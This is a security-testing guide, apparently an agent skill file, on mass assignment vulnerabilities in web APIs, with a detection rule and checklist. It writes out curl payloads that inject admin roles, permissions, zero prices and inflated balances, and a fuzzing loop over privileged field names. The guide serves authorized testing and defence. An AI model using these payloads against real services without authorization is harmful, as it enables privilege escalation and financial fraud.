---
name: testing-mass-assignment-vulnerabilities
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: testing-mass-assignment-vulnerabilities
description: >-
  Test APIs for mass assignment vulnerabilities by injecting unexpected fields
  into request payloads to escalate privileges, modify protected attributes,
  or bypass business logic constraints.
domain: cybersecurity
subdomain: api-security
tags:
  - mass-assignment
  - api-security
  - owasp-api3
  - parameter-pollution
  - privilege-escalation
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1190"]
  owasp-api: ["API3"]
  tools: ["curl", "burp-suite", "nuclei", "ffuf"]
---

# Testing Mass Assignment Vulnerabilities

## Overview

Mass assignment occurs when an API automatically binds client-supplied data to
internal object properties without proper filtering. Attackers inject fields
like `role`, `isAdmin`, `price`, or `balance` into requests to modify attributes
they should not control. OWASP API3:2023 — Broken Object Property Level
Authorization covers this class.

## Prerequisites

- Tools: ["curl", "burp-suite", "nuclei", "ffuf"]
- Test account with known baseline attributes
- API documentation or OpenAPI spec (if available)
- Authorized testing engagement with written scope

## Key Concepts

- **Mass assignment**: API binds all request fields to the data model without allowlist
- **Property injection**: Adding undocumented fields to create/update requests
- **Privilege escalation via fields**: Setting `role=admin` or `isVerified=true`
- **Price manipulation**: Overwriting calculated fields like `total` or `discount`

## Workflow

### Step 1: Enumerate Object Properties

Discover internal field names from API responses, documentation, and error messages:

```bash
# Retrieve full object to discover writable field candidates
curl -s -H "Authorization: Bearer $TOKEN" \
  https://target.com/api/users/me | jq 'keys'

# Check OpenAPI spec for model definitions
grep -A 30 'UserUpdate' openapi.yaml | grep -E '^\s+\w+:'

# Trigger verbose errors to leak field names
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"__invalid__": true}' \
  https://target.com/api/users/me | jq .
```

### Step 2: Test Privilege Escalation Fields

```bash
# Inject role/admin fields into profile update
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","isAdmin":true,"permissions":["*"]}' \
  https://target.com/api/users/me | jq .

# Verify if role was modified
curl -s -H "Authorization: Bearer $TOKEN" \
  https://target.com/api/users/me | jq '.role, .isAdmin, .permissions'

# Test account status manipulation
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"isVerified":true,"emailVerified":true,"status":"active"}' \
  https://target.com/api/users/me
```

### Step 3: Test Financial Field Manipulation

```bash
# Inject price/discount fields in order creation
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId":"123","quantity":1,"price":0.01,"discount":99.99,"total":0.01}' \
  https://target.com/api/orders

# Modify balance directly
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"balance":999999,"credits":999999}' \
  https://target.com/api/users/me/wallet
```

### Step 4: Fuzz Hidden Properties

```bash
# Fuzz with common mass assignment field names
cat > /tmp/mass_assign_fields.json << 'EOF'
["role","isAdmin","admin","is_admin","permissions","group","groupId",
 "organizationId","org_id","tenant_id","verified","email_verified",
 "is_active","status","type","userType","privilege","access_level",
 "credit","balance","discount","price","rate","plan","subscription"]
EOF

# Test each field injection via Burp Intruder or script
for FIELD in $(jq -r '.[]' /tmp/mass_assign_fields.json); do
  RESP=$(curl -s -o /dev/null -w "%{http_code}" \
    -X PUT -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"test\",\"$FIELD\":\"injected\"}" \
    "https://target.com/api/users/me")
  echo "$FIELD: HTTP $RESP"
done
```

### Step 5: Test Registration Endpoint

```bash
# Mass assignment during account creation
curl -s -X POST -H "Content-Type: application/json" \
  -d '{
    "email":"test@test.com",
    "password":"Test1234!",
    "role":"admin",
    "isAdmin":true,
    "plan":"enterprise",
    "verified":true
  }' https://target.com/api/register | jq .

# Compare with normal registration response
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"test2@test.com","password":"Test1234!"}' \
  https://target.com/api/register | jq .
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| Unexpected fields in requests | API gateway | Fields not in schema submitted |
| Role/permission changes | Application logs | User privilege modified via API |
| Price anomalies | Transaction logs | Orders with manipulated totals |
| Schema validation failures | WAF | Requests with extra properties |

```yaml
title: Potential Mass Assignment — Privilege Field Injection
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: Detects requests containing privilege escalation field names
logsource:
  category: webserver
detection:
  selection:
    cs-method:
      - PUT
      - POST
      - PATCH
    cs-body|contains:
      - '"role"'
      - '"isAdmin"'
      - '"permissions"'
      - '"is_admin"'
  condition: selection
falsepositives:
  - Admin interfaces that legitimately set user roles
level: high
tags:
  - attack.t1190
  - attack.initial_access
```

## Verification

- [ ] All object-modifying endpoints tested for extra field acceptance
- [ ] Privilege escalation fields tested (role, admin, permissions)
- [ ] Financial fields tested (price, balance, discount)
- [ ] Registration endpoint tested for field injection
- [ ] Results documented with before/after evidence
- [ ] Detection rules validated against test traffic

## References

- [OWASP API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
